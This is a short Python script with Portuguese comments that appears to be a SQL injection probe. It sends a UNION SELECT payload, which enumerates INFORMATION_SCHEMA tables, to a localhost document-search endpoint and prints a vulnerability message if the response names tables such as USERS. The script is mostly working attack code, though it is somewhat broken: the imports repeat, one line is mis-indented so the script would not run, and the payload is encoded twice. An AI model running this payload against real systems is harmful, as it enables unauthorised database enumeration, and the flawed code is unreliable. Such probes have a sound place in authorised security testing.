# Importação necessária
import urllib.parse

# Criação da variável de texto
texto_injetado = ' UNION SELECT TABLE_NAME, NULL, NULL FROM INFORMATION_SCHEMA.TABLES--'

# Importação necessária
import requests
import urllib.parse

# Codificação da variável para formato URL
texto_codificado = urllib.parse.quote(texto_injetado)

# Realização do pedido GET com o parâmetro query
url = 'http://localhost:8080/api/documents/search'
parametros = {'query': texto_codificado}
 resposta = requests.get(url, params=parametros)

# Importação necessária
import json

# Análise do JSON de resposta
def analisar_resposta(resposta):
    # Converter a resposta para JSON
    dados_json = resposta.json()
    
    # Buscar pelas strings 'USERS' ou 'DOCUMENTS'
    if 'USERS' in str(dados_json) or 'DOCUMENTS' in str(dados_json):
        print('Vulnerabilidade de Injeção SQL detetada no parâmetro de busca')

# Utilizar a função para analisar a resposta do servidor
analisar_resposta(resposta)